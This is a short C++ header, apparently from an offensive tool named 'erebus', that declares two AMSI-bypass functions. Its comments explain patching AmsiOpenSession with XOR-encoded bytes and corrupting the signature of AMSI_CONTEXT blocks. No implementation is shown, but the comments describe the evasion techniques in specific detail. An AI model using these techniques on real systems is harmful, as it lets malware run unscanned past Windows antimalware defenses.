#ifndef EREBUS_AMSI_BYPASS_HPP
#define EREBUS_AMSI_BYPASS_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Patch AmsiOpenSession in amsi.dll to return AMSI_RESULT_CLEAN (0)
    // immediately via `xor eax, eax; ret`. Prevents session creation so
    // no subsequent AmsiScanBuffer calls can succeed. XOR-encoded patch
    // bytes are decoded inline at runtime before application.
    // Requires CONFIG_AMSI_BYPASS_TYPE >= 2.
    BOOL PatchAmsiOpenSession();

    // Corrupt the Signature field of every live AMSI_CONTEXT block found
    // in the process heap. AmsiScanBuffer validates Signature == 'AMSI'
    // (0x49534D41) at offset 0 before scanning; zeroing it causes the API
    // to return E_INVALIDARG without touching the buffer contents.
    // Best-effort: contexts allocated after this call are not covered.
    // Requires CONFIG_AMSI_BYPASS_TYPE >= 3.
    BOOL InvalidateAmsiContext();

} // namespace evasion
} // namespace erebus

#endif // EREBUS_AMSI_BYPASS_HPP
